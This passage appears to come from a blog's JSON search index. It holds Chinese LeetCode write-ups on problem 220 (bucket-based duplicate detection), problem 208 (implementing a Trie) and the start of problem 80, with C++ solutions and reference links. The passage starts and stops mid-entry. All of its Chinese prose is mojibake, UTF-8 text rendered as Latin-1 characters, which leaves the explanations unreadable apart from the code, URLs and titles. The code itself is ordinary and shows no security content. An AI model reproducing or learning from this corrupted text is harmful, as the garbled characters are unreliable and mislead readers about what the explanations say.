å·æ¡¶ä¸­çš„ 8 ä¹Ÿæ˜¯æ»¡è¶³è¦æ±‚çš„ã€‚\næˆ‘ä»¬å¯¹ç»™å‡ºçš„æ•´å‹æ•°ç»„è¿›è¡Œéå†ï¼Œå¾—åˆ°ä¸€ä¸ªæ•°ä¹‹åå°±å»è®¡ç®—å®ƒæ‰€å±çš„ æ¡¶ç¼–å· ï¼Œç„¶åå°†è¿™ä¸€å¯¹ æ¡¶ç¼–å· â€”â€” æ•°å€¼ çš„æ˜ å°„ä¿å­˜èµ·æ¥ã€‚å¯¹äºä»»æ„ä¸€ä¸ªæ•°ï¼Œå¦‚æœå®ƒçš„æ¡¶ç¼–å·å·²ç»å­˜åœ¨äºæˆ‘ä»¬çš„è®°å½•ä¸­ï¼Œé‚£ä¹ˆæ˜¾ç„¶æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº† åŒä¸€ä¸ªæ¡¶ä¸­çš„ä¸¤ä¸ªæ•°å­— ï¼Œå°±å¯ä»¥ return true; äº†ï¼›å¦‚æœå®ƒçš„æ¡¶ç¼–å·ä¸å­˜åœ¨äºæˆ‘ä»¬çš„è®°å½•ä¸­ï¼Œæˆ‘ä»¬è¿˜è¦çœ‹çœ‹å®ƒä¸¤è¾¹çš„æ¡¶æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨çš„è¯å°±å–å‡ºå…¶ä¸­çš„æ•°å€¼æ¥æ¯”è¾ƒä¸€ä¸‹å¤§å°ï¼Œåˆ¤æ–­æ˜¯å¦æ»¡è¶³é¢˜æ„ã€‚\nè‡³æ­¤ï¼Œä»…å‰©æœ€åä¸€ä¸ªç»†èŠ‚äº†ï¼šè´Ÿæ•°ã€‚\nä½ ä¼šå‘ç°ï¼Œå¼•å…¥äº†è´Ÿæ•°ä¹‹åï¼Œå¦‚æœè¿˜æ˜¯è®¡ç®— n / (t + 1) çš„è¯ï¼Œä¼šå‡ºç°ä¸€äº›å°´å°¬çš„æƒ…å†µï¼Œè¿˜æ˜¯ä»¥ t = 3 ä¸ºä¾‹ï¼š\nå¼•å…¥è´Ÿæ•°çš„æ¡¶ç¼–å·è®¡ç®—ç»“æœ æœ‰å‡ ç‚¹é—®é¢˜ï¼š\n-3 å’Œ 3 çš„è®¡ç®—ç»“æœç«Ÿç„¶éƒ½æ˜¯ 0 ï¼Œå®ƒä»¬å±äºåŒä¸€ä¸ªæ¡¶ï¼Œä½†æ˜¯æ˜¾ç„¶ä¸ç¬¦åˆ abs(3 - (-3)) \u0026lt;= 3 è¿™ä¸€è¦æ±‚ -4 å’Œ -1 ~ -3 çš„è®¡ç®—ç»“æœç«Ÿç„¶æ˜¯ä¸ä¸€æ ·çš„ï¼Œä½†æ˜¯ -1 ~ -4 æ˜¾ç„¶åº”è¯¥å±äºåŒä¸€ä¸ªæ¡¶ æˆ‘ä»¬ä¸€ä¸€æ¥è¿›è¡Œè§£å†³ã€‚\né¦–å…ˆï¼Œè´Ÿæ•°å’Œæ­£æ•°éƒ½å¯èƒ½è®¡ç®—å‡ºç¼–å·ä¸º 0 çš„æ¡¶ï¼Œæˆ‘ä»¬ç›´æ¥ä»¤ è´Ÿæ•° çš„è®¡ç®—ç»“æœ å‡ä¸€ ï¼Œè¿™æ ·åšå¯¹äºæˆ‘ä»¬çš„æ¡¶ç¼–å·æ²¡æœ‰å½±å“ï¼Œä½†æ˜¯å¯ä»¥æŠŠè´Ÿæ•°çš„è®¡ç®—ç»“æœå’Œæ­£æ•°çš„è®¡ç®—ç»“æœåˆ†å¼€ã€‚\nè´Ÿæ•°çš„è®¡ç®—ç»“æœå‡ä¸€ å…¶æ¬¡ï¼Œæˆ‘ä»¬å·²ç»å°† 0 ~ 3 å½’äºæ­£æ•´æ•°çš„è®¡ç®—ä¸­äº†ï¼ˆ0å·æ¡¶ï¼‰ï¼Œåˆ™ä¸å¿…å†å°† 0 æ”¾å…¥åˆ°è´Ÿæ•°çš„é˜Ÿä¼ä¸­ï¼›è¿™æ ·æ¥è¯´ï¼Œå…¨ä½“è´Ÿæ•°åº”è¯¥å…ˆ åŠ ä¸Š1 å†è¿›è¡Œè®¡ç®—ï¼Œè¡¥ä¸Š 0 çš„ä½ç½®ã€‚\nè¿™æ ·ï¼Œ -1 ~ -4 å°±éƒ½å±äºåŒä¸€ä¸ªæ¡¶ä¸­äº†ã€‚\nè´Ÿæ•°å…ˆåŠ ä¸€å†è¿›è¡Œåç»­è®¡ç®— ç»¼åˆä»¥ä¸Šåˆ†æï¼Œæˆ‘ä»¬åœ¨å…·ä½“å®ç°ä¸­ä½¿ç”¨ä¸€ä¸ª map\u0026lt;int, int\u0026gt; æ¥ä¿å­˜ æ¡¶ç¼–å· â€”â€” æ•°å€¼ è¿™ä¸€æ˜ å°„ï¼Œéå†æ•°ç»„ï¼Œè®¡ç®—å¯¹åº”æ•°å€¼çš„æ¡¶ç¼–å·ï¼ŒæŸ¥çœ‹ map ä¸­æ˜¯å¦å·²ç»æœ‰äº†ç›¸åŒç¼–å·æˆ–ç›¸é‚»ç¼–å·çš„æ¡¶ï¼›æ ¹æ®é¢˜æ„ï¼Œæˆ‘ä»¬ä¸€æ¬¡åªèƒ½ä¿å­˜ k ä¸ªæ¡¶ï¼Œé‚£ä¹ˆåªéœ€è¦é‡æ–°è®¡ç®—è¾¹ç•Œæ•°å€¼å¯¹åº”çš„æ¡¶ç¼–å·ï¼Œå°†å…¶åˆ é™¤ä¹‹åå†ç»§ç»­è¿›è¡Œå¾ªç¯ã€‚\nACä»£ç 2 class Solution { public: int getID(int n, int t) { if (n \u0026gt;= 0) { return (long)n / ((long)t + 1); } else { return ((long)n + 1) / ((long)t + 1) - 1; } } bool containsNearbyAlmostDuplicate(vector\u0026lt;int\u0026gt;\u0026amp; nums, int k, int t) { map\u0026lt;int, int\u0026gt; bucket; for (int idx = 0; idx \u0026lt; nums.size(); idx++) { int id = getID(nums[idx], t); // cout \u0026lt;\u0026lt; id \u0026lt;\u0026lt; endl; auto ite = bucket.find(id); if (ite != bucket.end()) { if (abs((long)nums[idx] - ite-\u0026gt;second) \u0026lt;= t) return true; } ite = bucket.find(id - 1); if (ite != bucket.end()) { if (abs((long)nums[idx] - ite-\u0026gt;second) \u0026lt;= t) return true; } ite = bucket.find(id + 1); if (ite != bucket.end()) { if (abs((long)nums[idx] - ite-\u0026gt;second) \u0026lt;= t) return true; } bucket[id] = nums[idx]; if (idx - k \u0026gt;= 0) { ite = bucket.find(getID(nums[idx - k], t)); bucket.erase(ite); } } return false; } }; è¡¨ç°çƒ‚çˆ†ï¼Œå°±ä¸æ”¾å›¾äº†ã€‚ä¸€äº›é¢˜è§£ä¸­ä½¿ç”¨ map.count() æ¥åˆ¤æ–­æ¡¶æ˜¯å¦å­˜åœ¨ï¼Œæˆ‘ä½¿ç”¨ map.find() ï¼Œè¿™æ ·ä»£ç å°±å†—é•¿äº†ä¸€äº›ã€‚ä¸è¿‡æ—¢ç„¶æœ¬é¢˜çš„æ ¸å¿ƒç®—æ³•å®ç°äº†ï¼Œå…¶ä½™ç»†èŠ‚äº†è§£ä¾¿å¥½ã€‚\nå‚è€ƒèµ„æ–™ [1] åŠ›æ‰£å®˜æ–¹é¢˜è§£.å­˜åœ¨é‡å¤å…ƒç´  III[EB/OL].2021-04-17\nhttps://leetcode-cn.com/problems/contains-duplicate-iii/solution/cun-zai-zhong-fu-yuan-su-iii-by-leetcode-bbkt/\n[2] å®«æ°´ä¸‰å¶.ã€å®«æ°´ä¸‰å¶ã€‘ä¸€é¢˜åŒè§£ï¼šã€Œæ»‘åŠ¨çª—å£ \u0026amp; äºŒåˆ†ã€\u0026amp;ã€Œæ¡¶æ’åºã€è§£æ³•[EB/OL].2021-04-17\nhttps://leetcode-cn.com/problems/contains-duplicate-iii/solution/gong-shui-san-xie-yi-ti-shuang-jie-hua-d-dlnv/\n[3] é»çŒ«å¤§ä¾ .C++åˆ©ç”¨æ¡¶åˆ†ç»„ï¼Œè¯¦ç»†è§£é‡Š[EB/OL].2021-04-17\nhttps://leetcode-cn.com/problems/contains-duplicate-iii/solution/c-li-yong-tong-fen-zu-xiang-xi-jie-shi-b-ofj6/\n","date":"2021-04-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode220.-%E5%AD%98%E5%9C%A8%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0-iii/","title":"éš¾é¢˜æœ¬ | LeetCode220. å­˜åœ¨é‡å¤å…ƒç´  III"},{"content":"é¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/implement-trie-prefix-tree/\nå®šåœºå¥ï¼šäººä¸€èƒ½ä¹‹ï¼Œå·±ç™¾ä¹‹ï¼›äººåèƒ½ä¹‹ï¼Œå·±åƒä¹‹ã€‚æœèƒ½æ­¤é“çŸ£ï¼Œè™½æ„šå¿…æ˜ï¼Œè™½æŸ”å¿…å¼ºã€‚\né¢˜ç›® Trieï¼ˆå‘éŸ³ç±»ä¼¼ \u0026ldquo;try\u0026rdquo;ï¼‰æˆ–è€…è¯´ å‰ç¼€æ ‘ æ˜¯ä¸€ç§æ ‘å½¢æ•°æ®ç»“æ„ï¼Œç”¨äºé«˜æ•ˆåœ°å­˜å‚¨å’Œæ£€ç´¢å­—ç¬¦ä¸²æ•°æ®é›†ä¸­çš„é”®ã€‚è¿™ä¸€æ•°æ®ç»“æ„æœ‰ç›¸å½“å¤šçš„åº”ç”¨æƒ…æ™¯ï¼Œä¾‹å¦‚è‡ªåŠ¨è¡¥å®Œå’Œæ‹¼å†™æ£€æŸ¥ã€‚\nè¯·ä½ å®ç° Trie ç±»ï¼š\nTrie() åˆå§‹åŒ–å‰ç¼€æ ‘å¯¹è±¡ã€‚\nvoid insert(String word) å‘å‰ç¼€æ ‘ä¸­æ’å…¥å­—ç¬¦ä¸² word ã€‚\nboolean search(String word) å¦‚æœå­—ç¬¦ä¸² word åœ¨å‰ç¼€æ ‘ä¸­ï¼Œè¿”å› trueï¼ˆå³ï¼Œåœ¨æ£€ç´¢ä¹‹å‰å·²ç»æ’å…¥ï¼‰ï¼›å¦åˆ™ï¼Œè¿”å› false ã€‚\nboolean startsWith(String prefix) å¦‚æœä¹‹å‰å·²ç»æ’å…¥çš„å­—ç¬¦ä¸² word çš„å‰ç¼€ä¹‹ä¸€ä¸º prefix ï¼Œè¿”å› true ï¼›å¦åˆ™ï¼Œè¿”å› false ã€‚\nç¤ºä¾‹\nè¾“å…¥ï¼š\n[\u0026ldquo;Trie\u0026rdquo;, \u0026ldquo;insert\u0026rdquo;, \u0026ldquo;search\u0026rdquo;, \u0026ldquo;search\u0026rdquo;, \u0026ldquo;startsWith\u0026rdquo;, \u0026ldquo;insert\u0026rdquo;, \u0026ldquo;search\u0026rdquo;]\n[[], [\u0026ldquo;apple\u0026rdquo;], [\u0026ldquo;apple\u0026rdquo;], [\u0026ldquo;app\u0026rdquo;], [\u0026ldquo;app\u0026rdquo;], [\u0026ldquo;app\u0026rdquo;], [\u0026ldquo;app\u0026rdquo;]]\nè¾“å‡ºï¼š\n[null, null, true, false, true, null, true]\nè§£é‡Šï¼š\nTrie trie = new Trie();\ntrie.insert(\u0026ldquo;apple\u0026rdquo;);\ntrie.search(\u0026ldquo;apple\u0026rdquo;); // è¿”å› True\ntrie.search(\u0026ldquo;app\u0026rdquo;); // è¿”å› False\ntrie.startsWith(\u0026ldquo;app\u0026rdquo;); // è¿”å› True\ntrie.insert(\u0026ldquo;app\u0026rdquo;);\ntrie.search(\u0026ldquo;app\u0026rdquo;); // è¿”å› True\næ•°æ®èŒƒå›´ï¼š\n1 \u0026lt;= word.length, prefix.length \u0026lt;= 2000\nword å’Œ prefix ä»…ç”±å°å†™è‹±æ–‡å­—æ¯ç»„æˆ\ninsertã€search å’Œ startsWith è°ƒç”¨æ¬¡æ•° æ€»è®¡ ä¸è¶…è¿‡ 30000 æ¬¡\nåˆ†æ æ˜¯ä¸€ä¸ªå…¨æ–°çš„çŸ¥è¯†ç‚¹å‘¢ (#^.^#)\nå‰ç¼€æ ‘ Trie æ˜¯ä¸€ç§é«˜æ•ˆçš„ç”¨äºä¿¡æ¯æ£€ç´¢ï¼ˆinformation retrievalï¼‰çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥å°†æœç´¢å¤æ‚åº¦é™åˆ°æœ€ä½ï¼ˆå…³é”®å­—é•¿åº¦ï¼‰ã€‚å¦‚æœæˆ‘ä»¬è¦åœ¨ä¸€å †å­—ç¬¦ä¸²ä¸­å¯»æ‰¾ä¸€ä¸ªå­ä¸²ï¼Œå¸¸è§çš„ä½¿ç”¨ äºŒåˆ†æœç´¢æ ‘ çš„æ€è·¯æ—¶é—´å¤æ‚åº¦ä¸º O(M * log N) ï¼Œå…¶ä¸­ M æ˜¯æœ€é•¿å­ä¸²çš„é•¿åº¦ï¼ŒN æ˜¯ç°æœ‰çš„å­—ç¬¦ä¸²ä¸ªæ•°ã€‚è€Œä½¿ç”¨å‰ç¼€æ ‘ï¼Œæ—¶é—´å¤æ‚åº¦å¯ä»¥é™ä¸º O(M) ã€‚\nåŸç† â€”â€” æ’å…¥ å‰ç¼€æ ‘æ˜¯ä¸€é¢— å¤šå‰æ ‘ ï¼Œå®ƒçš„æ¯ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥åˆ†å‡ºè‹¥å¹²ä¸ªå­èŠ‚ç‚¹ï¼Œæ¯ä¸€æ¡è¾¹è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ã€‚ä½ å¯ä»¥å‘ç°ï¼Œä»æ ¹èŠ‚ç‚¹å¼€å§‹å‘ä¸‹èµ°å»ï¼Œæ¯èµ°è¿‡ä¸€æ¡è¾¹æˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªå­—ç¬¦ï¼Œéå†åˆ°ä¸€ä¸ª ç»ˆæ­¢èŠ‚ç‚¹ æ—¶ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ª å•è¯ï¼ˆå­—ç¬¦ä¸²ï¼‰ ã€‚\næ¯”å¦‚ï¼Œå•è¯ dog å°±èƒ½ç»„æˆè¿™ä¹ˆä¸€é¢—å‰ç¼€æ ‘ï¼š\nTrie â€œdogâ€ ä»æ ¹èŠ‚ç‚¹å‘ä¸‹éå†ï¼Œåˆ°äº†èŠ‚ç‚¹ 3 ï¼Œå®ƒåº”è¯¥è¢«æ ‡è®°ä¸º ç»ˆæ­¢èŠ‚ç‚¹ ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº† dog ã€‚\nç°åœ¨æˆ‘ä»¬å¸Œæœ›æ’å…¥ä¸€ä¸ªå•è¯ doge ï¼Œè¦æ€ä¹ˆåšå‘¢ï¼Ÿ\næˆ‘ä»¬è¿˜æ˜¯è¿›è¡Œéå†ï¼Œä»æ ¹èŠ‚ç‚¹å‡ºå‘ï¼Œä¾æ¬¡è·å– d ã€ o ã€ g ï¼Œæ¥åˆ°äº†èŠ‚ç‚¹ 3 ï¼Œåªéœ€è¦å†æ’å…¥ä¸€æ¡è¾¹è¡¨ç¤º e å°±å¯ä»¥äº†ï¼\nTrie â€œdogâ€ \u0026amp; â€œdogeâ€ åœ¨ä¸Šé¢çš„å›¾ä¸­ï¼Œæˆ‘æ ‡å‡ºäº† ç»ˆæ­¢èŠ‚ç‚¹ ï¼Œå½“æˆ‘ä»¬éå†åˆ° 3 æˆ– 4 æ—¶ï¼Œæˆ‘ä»¬çŸ¥é“å®ƒä»¬è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªåˆ‡å®å­˜åœ¨çš„å­—ç¬¦ä¸²ï¼›è€Œå½“æˆ‘ä»¬éå†åˆ° 2 æˆ– 1 æ—¶ï¼Œæˆ‘ä»¬çŸ¥é“ do æˆ–è€… d ä¸æ˜¯ä¸€ä¸ªåˆ‡å®å­˜åœ¨çš„å­—ç¬¦ä¸²ï¼Œå®ƒä»¬åªæ˜¯æŸä¸ªå•è¯çš„å‰ç¼€è€Œå·²ã€‚\nä»è¿™ä¸ªæ¨¡æ‹Ÿä¸­å¯ä»¥çœ‹åˆ°ï¼Œ doge å’Œ dog ä½¿ç”¨çš„æ˜¯åŒä¸€äº›å­—æ¯å‰ç¼€ï¼Œè¿™å°±æ˜¯ å‰ç¼€æ ‘ çš„æ„æ€ã€‚\næˆ‘ä»¬å†æ’å…¥ä¸€ä¸ªå•è¯ do ï¼Œè¿™æ—¶æ ¹æ®æˆ‘ä»¬éå†çš„ç»“æœå‘ç°ï¼Œåˆ°è¾¾èŠ‚ç‚¹ 2 çš„è·¯å¾„å°±èƒ½è¡¨ç¤ºè¿™ä¸ªå•è¯ï¼é‚£ä¹ˆæˆ‘ä»¬ä¸ç”¨å†ç”³è¯·ä¸€ä¸ªæ–°çš„èŠ‚ç‚¹ï¼Œç›´æ¥å°† 2 æ ‡è®°ä¸º ç»ˆæ­¢èŠ‚ç‚¹ å³å¯ã€‚\nTrie â€œdogâ€ \u0026amp; â€œdogeâ€ \u0026amp; â€œdoâ€ æœ€åï¼Œæ’å…¥ä¸€ä¸ª bye å§ï¼Œç›¸ä¿¡è¯»è€…å·²ç»èƒ½å¤Ÿæ¨¡æ‹Ÿå‡ºè¿™ä¸ªè¿‡ç¨‹äº†ï¼ï¼ˆä¹Ÿå¯ä»¥ç‚¹å¼€ä¸‹é¢çš„åŠ¨å›¾çœ‹çœ‹ç­”æ¡ˆï¼‰\nTrie.insert(â€œbyeâ€) Trie â€œdogâ€ \u0026amp; â€œdogeâ€ \u0026amp; â€œdoâ€ \u0026amp; â€œbyeâ€ åŸç† â€”â€” æŸ¥è¯¢ æˆ‘ä»¬èƒ½å¤Ÿæ’å…¥ä¸€ä¸ªå•è¯ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼Œå½“ç„¶ä¹Ÿå°±éœ€è¦èƒ½å¤ŸæŸ¥è¯¢æŸä¸ªå•è¯ã€‚å¯¹äºä¸€ä¸ªç»™å‡ºçš„å­—ç¬¦ä¸² s ï¼Œæˆ‘ä»¬ä» Trie çš„æ ¹èŠ‚ç‚¹å‡ºå‘ï¼Œæ²¿ç€å®ƒçš„æ¯ä¸€ä¸ªå­—ç¬¦å‘ä¸‹éå†ï¼Œå¦‚æœèƒ½å¤Ÿåˆ°è¾¾ä¸€ä¸ª ç»ˆæ­¢èŠ‚ç‚¹ ï¼Œé‚£ä¹ˆè¿™ä¸ªå­—ç¬¦ä¸² s å°±å­˜åœ¨äºæˆ‘ä»¬çš„é›†åˆä¸­ï¼Œå¦åˆ™å®ƒå°±æ˜¯ä¸å­˜åœ¨çš„ã€‚\nä¾‹å¦‚æˆ‘ä»¬è¦æŸ¥è¯¢å•è¯ bye ï¼Œä»æ ¹èŠ‚ç‚¹å‡ºå‘ï¼Œæ²¿ç€æ¯ä¸ªå­—ç¬¦å¯¹åº”çš„è·¯å¾„ä¾æ¬¡æ¥åˆ°äº† 5 ã€ 6 ã€ 7 ï¼Œæœ€åæˆ‘ä»¬å‘ç°èŠ‚ç‚¹ 7 æ˜¯ä¸ªç»ˆæ­¢èŠ‚ç‚¹ï¼Œå¤ªå¥½äº†ï¼Œè¿™ä¸ªå•è¯å°±æ˜¯å­˜åœ¨çš„ã€‚\nè€Œå½“æˆ‘ä»¬è¦æŸ¥è¯¢å•è¯ by ï¼Œä»æ ¹èŠ‚ç‚¹å‡ºå‘ï¼Œä¾æ¬¡æ¥åˆ° 5 ã€ 6 ,èŠ‚ç‚¹ 6 ä¸æ˜¯ç»ˆæ­¢èŠ‚ç‚¹ï¼Œé‚£ä¹ˆè¿™ä¸ªå•è¯å°±ä¸å­˜åœ¨äºæˆ‘ä»¬çš„é›†åˆä¸­ã€‚\nåŸç† â€”â€” æ„é€  ç°åœ¨ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå°†ä¸€ä¸ªå•è¯æ’å…¥ Trie ä¸­ï¼Œä¹Ÿèƒ½æŸ¥è¯¢ä¸€ä¸ªå•è¯æ˜¯å¦å­˜åœ¨äº Trie ä¸­äº†ï¼Œæœ€åçš„é—®é¢˜æ˜¯ï¼Œå¦‚ä½•æ„é€ è¿™é¢—å‰ç¼€æ ‘å‘¢ï¼Ÿ\nä»ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œä½ åº”è¯¥æƒ³åˆ°ï¼Œè¿™é¢—å‰ç¼€æ ‘åº”è¯¥æ˜¯ä¸€é¢— å¤šå‰æ ‘ ï¼Œæ­£å¦‚ä¸€å¼€å§‹æ‰€è¯´çš„é‚£æ ·ï¼Œè€Œä¸”ï¼Œå®ƒæ¯ä¸€ä¸ªèŠ‚ç‚¹æ‰€åˆ†å‡ºæ¥çš„è¾¹å¿…é¡»èƒ½å¤Ÿè¡¨ç¤ºæˆ‘ä»¬çš„ å­—ç¬¦é›† ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå‡å¦‚æˆ‘ä»¬çš„å­—ç¬¦é›†è®°åš Î£ ï¼Œé‚£ä¹ˆå‰ç¼€æ ‘çš„æ¯ä¸ªèŠ‚ç‚¹å°±åº”è¯¥æœ‰ len(Î£) æ•°é‡çš„è¾¹ã€‚åœ¨è¿™é“é¢˜ä¸­ï¼ˆä½ å¯èƒ½å·²ç»å¿˜äº†é¢˜ç›®äº†~ï¼‰ï¼Œæ¯ä¸ªèŠ‚ç‚¹åˆ†å‡ºæ¥çš„è¾¹æ•°é‡å°±æ˜¯ 26 ï¼Œè¡¨ç¤º a ~ z æ˜¯ä¹Ÿã€‚\næ–¹æ³•ä¸€ å¦‚æœæˆ‘ä»¬å¯¹èŠ‚ç‚¹è¿›è¡Œç¼–å·ï¼Œå°±å¯ä»¥ç”¨ä¸€ä¸ª äºŒç»´æ•°ç»„ æ¥ä¿å­˜æ•´ä¸ª Trie äº†ï¼Œæˆ‘ä»¬å£°æ˜ä¸€ä¸ª trie[NODE_NUM][26] ï¼Œç¬¬ä¸€ä¸ªä¸‹æ ‡è¡¨ç¤ºèŠ‚ç‚¹ç¼–å·ï¼Œç¬¬äºŒä¸ªä¸‹æ ‡è¡¨ç¤ºåˆ†å‡ºæ¥çš„26æ¡è¾¹ï¼Œæ¯ä¸ªè¾¹è¡¨ç¤ºä¸€ä¸ªå­—æ¯ã€‚\nå¦‚ä½•è¡¨ç¤ºç»ˆæ­¢èŠ‚ç‚¹å‘¢ï¼Ÿå¾ˆç®€å•ï¼Œå†å£°æ˜ä¸€ä¸ª mark[NODE_NUM] å³å¯ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªèŠ‚ç‚¹çš„ç¼–å· p ï¼Œå½“ mark[p] ä¸º 1 çš„æ—¶å€™è¡¨ç¤ºå®ƒæ˜¯ç»ˆæ­¢èŠ‚ç‚¹ã€‚\næ ¹èŠ‚ç‚¹ç¼–å·æ˜¯ 0 ï¼Œå¯¹äºæˆ‘ä»¬ä¸Šé¢çš„ä¾‹å­æ¥è¯´ï¼Œbye è¿™ä¸ªå•è¯å¯¹åº”çš„è·¯å¾„æ˜¯è¿™æ ·çš„ï¼š\ntrie[0][1] = 5 trie[5][24] = 6 trie[6][4] = 7 æ¯ä¸€ä¸ªå­—ç¬¦ ch å¯¹åº”çš„ç¬¬äºŒä¸ªä¸‹æ ‡å°±ç®€å•åœ°ç”¨ ch - 'a'æ¥è¡¨ç¤ºå°±è¡Œäº†ã€‚\næ–¹æ³•äºŒ ç¬¬ä¸€ç§æ„é€ æ–¹æ³•èƒœåœ¨ç®€å•ï¼ŒèŠ‚ç‚¹ä¸‹æ ‡å’Œå»¶ä¼¸å‡ºçš„è¾¹å«ä¹‰å¾ˆç›´è§‚ï¼Œä½†æ˜¯æ‰€è€—è´¹çš„ç©ºé—´æ¯”è¾ƒå¤§ï¼Œå³ä½¿æŸæ¡è·¯å¾„æ˜¯ä¸å­˜åœ¨çš„ï¼ˆå¦‚å•è¯ hello ï¼‰ï¼Œå®ƒæ‰€å¯¹åº”çš„ç©ºé—´è¿˜æ˜¯å­˜åœ¨äºæ•°ç»„ä¸­ï¼ˆåªä¸è¿‡éƒ½è¢«å†™ä¸ºäº† 0 æ¥è¡¨ç¤ºä¸å­˜åœ¨ï¼‰ã€‚\nå¦‚æœæˆ‘ä»¬ç”¨é“¾è¡¨çš„æ€æƒ³ + åŠ¨æ€ç”³è¯·å†…å­˜çš„åŠæ³•ï¼Œæ•ˆæœåˆ™å¤§ä¸ç›¸åŒã€‚ä½¿ç”¨ä¸€ä¸ªæ•°æ®ç»“æ„æ¥è¡¨ç¤ºèŠ‚ç‚¹ï¼Œå®ƒå«æœ‰ä¸€ä¸ªé•¿åº¦ä¸º 26 çš„ æŒ‡é’ˆæ•°ç»„ ï¼Œæ¯ä¸€ä¸ªå•å…ƒè¡¨ç¤ºå¯¹åº”çš„è¾¹ï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚åŒæ—¶ï¼Œè¿™ä¸ªç»“æ„é¡ºä¾¿å®šä¹‰äº†ä¸€ä¸ªæˆå‘˜å˜é‡æ¥è¡¨ç¤ºè¯¥èŠ‚ç‚¹æ˜¯å¦ä¸ºç»ˆæ­¢èŠ‚ç‚¹ï¼Œè¿™ç§åŠæ³•å°±ç®€æ´å¤šäº†ã€‚\nACä»£ç 1 æ­¤ä»£ç å¯¹åº”æ„é€ æ–¹æ³•1\nclass Trie { public: int tire[100000][26]; int mark[100000]; int k; /** Initialize your data structure here. */ Trie() { k = 1; memset(tire, 0, sizeof(tire)); memset(mark, 0, sizeof(mark)); } /** Inserts a word into the trie. */ void insert(string word) { int p = 0; int c = 0; for (auto ch : word) { c = ch - \u0026#39;a\u0026#39;; if (tire[p][c] != 0) { p = tire[p][c]; } else { tire[p][c] = k; // ç¼–å·ä»1å¼€å§‹ k++; p = tire[p][c]; } } mark[p] = 1; } /** Returns if the word is in the trie. */ bool search(string word) { int p = 0; int c = 0; for (auto ch : word) { c = ch - \u0026#39;a\u0026#39;; if (tire[p][c] != 0) { p = tire[p][c]; } else { return false; } } if (mark[p]) return true; else return false; } /** Returns if there is any word in the trie that starts with the given prefix. */ bool startsWith(string prefix) { int p = 0; int c = 0; for (auto ch : prefix) { c = ch - \u0026#39;a\u0026#39;; if (tire[p][c] != 0) { p = tire[p][c]; } else { return false; } } return true; } }; /** * Your Trie object will be instantiated and called as such: * Trie* obj = new Trie(); * obj-\u0026gt;insert(word); * bool param_2 = obj-\u0026gt;search(word); * bool param_3 = obj-\u0026gt;startsWith(prefix); */ ACä»£ç 2 æ­¤ä»£ç å¯¹åº”æ„é€ æ–¹æ³•2\nclass Trie { public: typedef struct n { struct n* childen[26]; int mark; } Node, *PNode; PNode root; /** Initialize your data structure here. */ Trie() { root = new Node; for (int i = 0; i \u0026lt; 26; i++) { (*root).childen[i] = 0; } } /** Inserts a word into the trie. */ void insert(string word) { PNode p = root; int c = 0; for (auto ch : word) { c = ch - \u0026#39;a\u0026#39;; if ((*p).childen[c]) { p = (*p).childen[c]; } else { (*p).childen[c] = new Node; p = (*p).childen[c]; for (int i = 0; i \u0026lt; 26; i++) { (*p).childen[i] = 0; } p-\u0026gt;mark = 0; } } p-\u0026gt;mark = 1; } /** Returns if the word is in the trie. */ bool search(string word) { PNode p = root; int c = 0; for (auto ch : word) { c = ch - \u0026#39;a\u0026#39;; if ((*p).childen[c]) { p = (*p).childen[c]; } else { return false; } } if (p-\u0026gt;mark) return true; else return false; } /** Returns if there is any word in the trie that starts with the given prefix. */ bool startsWith(string prefix) { PNode p = root; int c = 0; for (auto ch : prefix) { c = ch - \u0026#39;a\u0026#39;; if ((*p).childen[c]) { p = (*p).childen[c]; } else { return false; } } return true; } }; /** * Your Trie object will be instantiated and called as such: * Trie* obj = new Trie(); * obj-\u0026gt;insert(word); * bool param_2 = obj-\u0026gt;search(word); * bool param_3 = obj-\u0026gt;startsWith(prefix); */ Performanceâ€”â€”æ–¹æ³•2 Performance Compare å‚è€ƒèµ„æ–™ [1] å‘å‰èµ°åˆ«å›å¤´.å­—å…¸æ ‘ï¼ˆå‰ç¼€æ ‘ï¼‰[EB/OL].2018-08-24\nhttps://blog.csdn.net/weixin_39778570/article/details/81990417\n[2] GeeksforGeeks.Trie | (Insert and Search)[EB/OL].2019-09-04\nhttps://www.geeksforgeeks.org/trie-insert-and-search/\n","date":"2021-04-14T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode208.-%E5%AE%9E%E7%8E%B0-trie-%E5%89%8D%E7%BC%80%E6%A0%91/","title":"éš¾é¢˜æœ¬ | LeetCode208. å®ç° Trie (å‰ç¼€æ ‘)"},{"content":"é¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/\né¢˜ç›® ç»™ä½ ä¸€ä¸ªæœ‰åºæ•°ç»„ nums ï¼Œè¯·ä½  åŸåœ° åˆ é™¤é‡å¤å‡ºç°çš„å…ƒç´ ï¼Œä½¿æ¯ä¸ªå…ƒç´  æœ€å¤šå‡ºç°ä¸¤æ¬¡ ï¼Œè¿”å›åˆ é™¤åæ•°ç»„çš„æ–°é•¿åº¦ã€‚\nä¸è¦ä½¿ç”¨é¢å¤–çš„æ•°ç»„ç©ºé—´ï¼Œä½ å¿…é¡»åœ¨ åŸåœ° ä¿®æ”¹è¾“å…¥æ•°ç»„ å¹¶åœ¨ä½¿ç”¨ O(1) é¢å¤–ç©ºé—´çš„æ¡ä»¶ä¸‹å®Œæˆã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š nums = [1,1,1,2,2,3] è¾“å‡ºï¼š 5, nums = [1,1,2,2,3] 